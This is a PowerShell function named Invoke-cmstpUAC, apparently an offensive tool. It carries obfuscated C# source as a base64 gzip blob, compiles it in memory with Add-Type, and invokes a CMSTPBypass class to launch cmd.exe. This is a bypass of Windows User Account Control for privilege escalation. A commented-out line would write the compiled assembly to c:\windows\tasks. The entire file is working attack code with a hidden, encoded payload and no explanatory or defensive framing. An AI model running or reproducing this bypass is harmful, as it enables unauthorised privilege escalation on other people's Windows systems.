function Invoke-cmstpUAC {
    [CmdletBinding()]
    Param (
        [String] $cmd = "c:\windows\system32\cmd.exe"
    )
    # 
    # gzip -c Source_obfs.cs | base64 -w0
    $gzipB64 = "H4sICDULiWgAA1NvdXJjZV9vYmZzLmNzAI1XW2/aSBR+96+YtVrJFpZJSNPsLmUVLiZFhRRhWqoNqHLswYzqm8ZjIIr47z1jD/EF4pQHx5k55zv3i5OYBC4yn2KG/baUFP7T53jPKkejr5WDAbHcIIwZsePKTT/0ozDAAZuEDvZOLj0P24yEQazf4QBTYlcoFiRwwl0VdJYEjPhYHwUM0zAyMd0SGwMVkqLk0SM2sj0rjlF/Ys6nvacI3qVnCcEvomRrMYxiZoGy8Idy2FGwHljMQh10Kz9sMY1Bo5VkEjewWEJx5529Ibblhu+krrO1Ahs7o/thp6Vfg8CHAV5bicdGAWB63krqJzEL/QEGbwA7IHX4Cb/mZ2Zmb9fzvsUgSAJTphSbmCURuMq3AifunDkTbFze67cr6a47GQ1HxuDnojubdu8NiVnxr1/E81BzNEGT7qw3hsueYQxRc8jBalRbSR/+ubi40PjzssNPwc8/x4PRQBBq6IZDnLlZSbL8+ct4IssakmXz63AO+hjLCbFpGIdrthRhXfYTSiE3vmcuX3ajCE0ttomXJvYjTIdEJwHJUKY0XBMPCzdzquz8/bcA7yOQix2D0pC+z45lmetmpvEFU0SK3Fs+7sjy9+k93JubkDJza5cOkSTzNOK58jDwvBFkL2WKnIBHrlq643myukIiyUQSQX1gGqDHMPQQYO4y4xRIzimjaLMIHA2RgKGg7zv8Xm3XwWsIQju2YpZaAynJaILrZWI2DCl2aZgEzqlw9WjP+dzvTUGGbP+7XO5EUJZyu4Z+H3H6OMJXPms9yW3UbKI4LcurlgbPqIb3MeWNgFj37X3Ka/sxi3S8xzVsbsrWv5q1Jvqd8SOT2Z9M7mbgM+OHUcOKU9bnmTG/P2R8z8b93JgdzvGMScw+QaT+Q7sw+AWMAd4VDp8/atfapdbSoCa0K+1Guzq0OUrRCnT7eNYBOUp0FppDftA+AvglQF8D+N/azYErXLAT3bpvgLuvgLdSjTn4tdA501s4A93iN4A39Q4pgBYc8rYz/Ff0vQEfXwutP76AN5vHRKtHdc6iZniXFVU5apq1Uk0WQYXBiBhC+1HEiei889DYYzthWE25sxnDf4JsBjShzxl5kwGdeN+CUcfKF4qqm5FHmNIPAxg/TJ+H/Y1FFVmXVfXhYtWu4s4xbxwWfRoQ3iKghhu89Wyxp+wjjduv5jxZE+wlxHMwRV8TFiWMSxYuKl0rBb6cUofGjANHKYqtJZShidQSlO2vx4IZsJZftQdMyMf3qT3irsCeM+gzHHmWjRW5OjehC59EuB6hNLC0YzDcSOP1rr7BXBzMOfNjpO0qzKlfFpQwDFOXL2ZKwV/zMDNdUbWilPy4AERhfYD5cZY7ozqIgiiNnXTeCIf8aSmQtfJXKsHYQzHGSm/ayFOVNwC1wdOlUbVafUHIsQqqry0vxrlBh1fSQ9TtW7kuyI45Vyj4E/Ne5in/wVYCi2dsMotyjpA7SrxlEqsEf2x+seYFr96lbuLDvhTzoda0EiRD3R9VrwawzAornbnBniesAICKA4Wieqqp8sJYslZsFdmi8Bm88uLY7KYoukKUEej/w76e0zhhJbYVJghDts90Ya3cYiX30abiowPabXiYlTJCSS6Q50lS+rzQYX/ywXQI/Rf8lL0sLOjHQiCONLciUGQhX86O9XJ2yxIuq1oiakc4Pe2BlbIRVw8rBKFwMePDQ4QI5od4xXHvKR0gRaB2sfQyZn2MA5dtuEMu1KPuZ0OS0cPMge60pjjelKskNWbxJ/GvEOW4E4sExcuSuoua8NXqfW4JLoIV50e+oxcpNHR9Gt9TRQ+1i0KWL1khojutsH+M1ZPtIEmXUzkXuoaFX+GfCqRz0Ubk0xi+kOFTF14bDbVcKSkvPBroTjeTxwxRGT+QlXapnmuLwqAkejHjIP0GXmD4rfYPAAA=";
    $gzipBytes = [Convert]::FromBase64String($gzipB64);
    $gzipMemoryStream = [IO.MemoryStream]::new($gzipBytes);
    $gzipStream = [IO.Compression.GzipStream]::new($gzipMemoryStream, [IO.Compression.CompressionMode]::Decompress)
    $binaryMemoryStream = [IO.MemoryStream]::new()
    $gzipStream.CopyTo($binaryMemoryStream);
    $reader = [IO.StreamReader]::new($binaryMemoryStream)
    $binaryMemoryStream.Position = 0
    Add-Type -TypeDefinition $reader.ReadToEnd() -ReferencedAssemblies "System.Windows.Forms"
    # Add-Type -TypeDefinition $reader.ReadToEnd() -ReferencedAssemblies "System.Windows.Forms" -OutputAssembly c:\windows\tasks\doosey.dll
    $gzipMemoryStream, $binaryMemoryStream, $reader | % {$_.Dispose()}
    [CMSTPBypass]::Execute($cmd)
}